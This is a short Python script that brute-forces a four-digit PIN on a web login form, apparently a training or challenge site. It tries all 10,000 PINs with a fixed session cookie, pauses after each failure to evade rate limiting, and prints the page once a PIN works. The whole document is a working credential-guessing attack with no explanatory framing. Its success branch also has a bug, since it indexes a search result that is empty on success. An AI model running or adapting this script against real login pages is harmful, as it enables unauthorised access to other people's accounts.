#!/usr/bin/python3

import requests
import re
import time

url = "http://12.cybertrial.co.uk/login"
cookies = {"PHPSESSID": "v1mekpi6ut56i3gq8h7b563088"}

r = requests.session()

for curPin in range(0, 10000):
	payload = {"formgo": "1", "pin": "{0:0=4d}".format(curPin)}
	print("Trying pin: " + payload["pin"])

	response = r.post(url, data=payload, cookies=cookies)

	check = re.search("you entered a wrong pin", response.text)

	if(check[0] == "you entered a wrong pin"):
		time.sleep(0.7)
	else:
		print(response.text)
		print("Working pin: " + payload["pin"])
		break;

